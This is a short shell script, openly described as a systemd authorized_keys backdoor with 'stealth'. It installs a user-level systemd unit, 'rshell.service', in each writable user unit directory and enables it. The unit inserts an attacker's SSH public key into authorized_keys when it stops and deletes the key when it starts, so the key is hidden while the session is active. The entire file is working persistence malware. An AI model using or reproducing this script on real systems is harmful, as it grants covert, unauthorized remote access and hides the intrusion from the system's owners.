#!/bin/sh
# systemd authorized_keys backdoor + "stealth"

KEYS="ssh-ed25519 insert_y_ssh_pub_key"
SYSTEMD_PATH="/usr/lib/systemd/user/ $HOME/.local/share/systemd/user/ /etc/systemd/user/ $HOME/.config/systemd/user/ $XDG_RUNTIME_DIR/systemd/user/"
W_PATH=""
UNIT="rshell.service"
UNIT_CONTENT="[Unit]
description=Y are pwned

[Service]
RemainAfterExit=yes
Type=simple
ExecStop=/bin/bash -c 'mkdir -p \$HOME/.ssh && touch \$HOME/.ssh/authorized_keys; [ \"\$(grep \"$KEYS\" \$HOME/.ssh/authorized_keys)\" ] || echo \"$KEYS\" >> \$HOME/.ssh/authorized_keys'
ExecStart=/bin/bash -c 'sed -i \'/$KEYS/d\' \$HOME/.ssh/authorized_keys'

[Install]
WantedBy=default.target"
for i in $SYSTEMD_PATH; do
        mkdir -p "$i"
        if [ -w "$i" ]; then W_PATH="${i%/} $W_PATH"; fi
done

for k in $W_PATH; do
        echo "$UNIT_CONTENT" > "$k/$UNIT"
	echo "[*] created shell in '$k/$UNIT'"
done
systemctl --user daemon-reload
systemctl --user start $UNIT > /dev/null
systemctl --user enable $UNIT
